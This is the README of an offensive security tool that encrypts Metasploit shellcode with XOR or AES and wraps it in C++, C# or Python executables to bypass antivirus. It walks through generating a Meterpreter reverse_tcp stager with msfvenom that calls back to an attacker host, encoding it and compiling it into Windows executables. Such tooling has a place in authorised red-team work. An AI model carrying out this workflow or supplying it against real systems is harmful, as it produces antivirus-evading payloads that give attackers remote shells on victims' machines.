Mutlibyte XOR or AES encrypted shellcode
============

Author: Arno0x0x - [@Arno0x0x](http://twitter.com/Arno0x0x)

These little proof of concept are inspired by this blogpost: [Bypass antivirus with 10 lines of code](http://www.attactics.org/2016/03/bypassing-antivirus-with-10-lines-of.html)

The technique uses two kind of code file:

1. The shellcode encoder/encrypter: `shellcode_encoder.py`
2. Various shellcode wrapper, in C++, C# and Python:
	- `encryptedShellcodeWrapper.cpp` - for now supports **only** XOR encryption
	- `encryptedShellcodeWrapper.cs` - supports both XOR and AES encryption
	- `encryptedShellcodeWrapper.py` - supports both XOR and AES encryption

Installation
----------------------
Installation is straight forward:
* Git clone this repository: `git clone https://github.com/Arno0x/ShellcodeWrapper ShellcodeWrapper`
* cd into the ShellcodeWrapper folder: `cd ShellcodeWrapper`
* Install requirements using `pip install -r requirements.txt`
* Give the execution rights to the main script: `chmod +x shellcode_encoder.py`

Usage
----------------------
First, you need to obtain a usable shellcode from metasploit (*run it from a Kali distribution*), for example:
```
root@kali:~# msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.52.130 LPORT=4444 -f raw > shellcode.raw
```

In this example, the output is a raw (*unencoded & unencrypted*) reverse_tcp meterpreter stager for x86 platform. You should adapt it to your needs (*payload and parameters*).

Second, run the `shellcode_encoder.py` script along with the desired arguments:
  - raw shellcode filename
  - encryption key
  - encryption type: `xor` or `aes`
  - desired output: `base64`, `cpp`, `csharp`, `python`

For instance, to xor encrypt the shellcode with the key '*thisismykey*' and get an output code file in C#, C++ and Python:
```
root@kali:~# ./shellcode_encoder.py -cpp -cs -py shellcode.raw thisismykey xor
```
This will generate C#, C++ and Python code file in the `result` folder. Those files are ready to use/compile.

Eventually:

1. For the C++ wrapper, compile the C++ code file into a Windows executable: you can create a new VisualStudio project for **Win32 console application** and use the C++ code provided as the main file. Any other method of compilation will require slight adjustment of the C++ code (headers mostly).
2. For the C# wrapper, compile the C# code file into a Windows executable:
	`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:multibyteEncodeShellcode.exe multibyteEncodeShellcode.cs`
3. For the Python wrapper, just run it as a python script, or use PyInstaller to make it a Windows standalone executable
